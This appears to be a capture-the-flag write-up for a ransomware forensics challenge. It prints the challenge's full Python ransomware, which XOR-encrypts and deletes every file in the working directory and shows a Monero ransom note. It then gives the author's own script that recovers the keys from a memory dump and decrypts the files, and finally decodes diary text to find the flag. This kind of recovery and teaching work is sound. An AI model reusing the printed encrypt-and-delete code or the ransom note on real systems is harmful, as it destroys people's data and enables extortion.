# Day 11

Attachment:

```python
import ctypes,os,sys,time
k32=ctypes.windll.kernel32
k32.VirtualAlloc.restype=ctypes.c_void_p
k32.VirtualAlloc.argtypes=[ctypes.c_void_p,ctypes.c_size_t,ctypes.c_ulong,ctypes.c_ulong]
m,r,p=0x1000,0x2000,0x04
s_name="FreeRobux.py"
k_size=32
f_size=60
marker=b'\xAA\xBB\xCC\xDD'
def x(d,k):
    if not k:return b''
    o=bytearray()
    kl=len(k)
    for i,b in enumerate(d):o.append(b^k[i%kl])
    return bytes(o)
def note():
    return """
<==================================================================>
                    !!! SYNDICATE LOCKER !!!
<==================================================================>

Your network has been breached and all your files have been encrypted.
Do not waste your time attempting to recover them. We use a military-
grade encryption algorithm that is impossible to break.

To restore your data, you must purchase our decrypter.

Payment is 5 Monero (XMR) to the following wallet:
45i3fEE5547eB5y6152Fh321v9aKzDSb353fL9bA78gH5f6s2D4hG1jK3l4mN5oP6qR7sT8u

After payment, contact us via TOX chat with your transaction ID.
TOX ID: 5A1B79C4E0F1234567890ABCCPF1234567890ABCDEF1234567890ABCDEF

You have 48 hours. After that, your decryption key will be destroyed.
Any interference will lead to the immediate destruction of your key.

<==================================================================>
    [System is locked. Awaiting further commands...]
<==================================================================>
"""
def run():
    f_list=[f for f in os.listdir('.') if os.path.isfile(os.path.join('.',f)) and f!=s_name and not f.endswith('.enc')]
    if not f_list:return
    e_size=f_size+k_size+len(marker)
    t_size=4+(len(f_list)*e_size)
    m_ptr=k32.VirtualAlloc(None,t_size,m|r,p)
    if not m_ptr:sys.exit(1)
    c_off=0
    for f_name in f_list:
        try:
            k=os.urandom(k_size)
            f_bytes=f_name.encode('utf-8')[:f_size].ljust(f_size,b'\x00')
            blob=f_bytes+k+marker
            buff=(ctypes.c_char*len(blob)).from_buffer_copy(blob)
            ctypes.memmove(m_ptr+c_off,buff,len(blob))
            c_off+=e_size
            with open(f_name,"rb") as f_in:p_text=f_in.read()
            c_text=x(p_text,k)
            with open(f_name+".enc","wb") as f_out:f_out.write(c_text)
            os.remove(f_name)
        except:continue
    os.system('cls' if os.name=='nt' else 'clear')
    print(note())
    try:
        while True:time.sleep(3600)
    except KeyboardInterrupt:sys.exit(0)
if __name__=="__main__":
    run()
```

The code encrypts each file with a 32-byte key, and the keys are stored in the memory, which can be found in the memory dump. By finding the file name, we can locate the key and decrypt the files:

```python
import glob
import os

data = open("ransomware.DMP", "rb").read()
for file in glob.glob("encrypted_files/*"):
    name = os.path.split(file)[1]
    name = name.removesuffix(".enc")
    i = 0
    while True:
        i = data.find(name.encode(), i)
        if i == -1:
            break
        # possible key location
        offset = i + 60
        key = data[offset : offset + 32]
        mark = data[offset + 32 : offset + 36]
        if mark == b"\xaa\xbb\xcc\xdd":
            print(name, i, key, mark)
            # decrypt
            cipher = open(file, "rb").read()
            open(name, "wb").write(
                bytes([ch ^ key[i % 32] for i, ch in enumerate(cipher)])
            )
        i += len(name)
```

Then, we found two PDF files and a PNG. The PDF files contains some string that need to be decoded:

```python
# use pdftotext to extract text
elf41 = open("Elf 41's Diary.txt").read()
elf41 = elf41.replace("\n", " ").replace("\f", " ").removeprefix("Elf41’s Diary")
print(elf41)
data = [int(part.replace("4","0"), 2)for part in elf41.split()]
print(bytes(data).decode())

elf67 = open("Elf67’s Diary.txt").read()
elf67 = elf67.replace("\n", " ").replace("\f", " ").removeprefix("Elf67’s Diary")
print(elf67)
data = [int(part.replace("6","0").replace("7", "1"), 2)for part in elf67.split()]
print(bytes(data).decode())
```

Flag is embeeded in the output:

```
army behind it, were too much to be borne: besides, the sight or even the
thought of Goldstein produced fear and anger automatically. csd{73rr1bl3_R4ns0m3w3r3_4l50_67_15_d34d} He was an object
of hatred more constant than either Eurasia or Eastasia, since when Oceania
was at war with one of these Powers it was generally at peace with the other.
```